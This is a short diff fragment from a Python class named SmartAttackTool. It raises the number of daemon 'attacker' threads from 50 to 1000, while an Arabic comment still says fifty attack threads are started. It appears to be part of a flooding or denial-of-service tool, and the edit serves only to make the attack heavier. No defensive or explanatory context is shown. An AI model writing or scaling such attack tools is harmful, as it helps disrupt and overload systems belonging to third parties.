@@ -74,7 +74,7 @@ class SmartAttackTool:
                 time.sleep(random.uniform(0.5, 2))
 
         # بدء 50 خيط هجومي
-        for _ in range(50):
+        for _ in range(1000):
             t = threading.Thread(target=attacker)
             t.daemon = True
             t.start()
